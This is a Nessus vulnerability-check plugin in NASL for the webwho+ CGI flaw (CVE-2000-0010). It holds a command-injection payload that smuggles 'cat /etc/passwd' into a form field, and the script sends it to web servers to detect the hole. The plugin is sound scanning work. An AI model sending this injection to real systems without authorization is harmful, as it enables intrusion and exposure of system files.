#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11333);
 script_version ("$Revision: 1.2 $");
 script_bugtraq_id(892);
 script_cve_id("CVE-2000-0010");
 
 name["english"] = "webwho plus";

 script_name(english:name["english"]);
 
 desc["english"] = "The CGI 'webwho+' allows an attacker
to view any file on the target computer, as well as execute
arbitrary commands. 

Risk factor : Medium/High
Solution : Upgrade to a newer version.";

 

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks if webwho.pl is vulnerable";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 cmd = 'command=X&type="echo foo;cat /etc/passwd;echo foo&Check=X';
 req = http_post(item:string(dir, "/webwho.pl"), port:port);
 idx = stridx(req, string("\r\n\r\n"));
 req = insstr(req, string("\r\nContent-Length: ", strlen(cmd), "\r\n\r\n"), idx);
 req = string(req, cmd);
 result = http_keepalive_send_recv(port:port, data:req);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_hole(port);
}
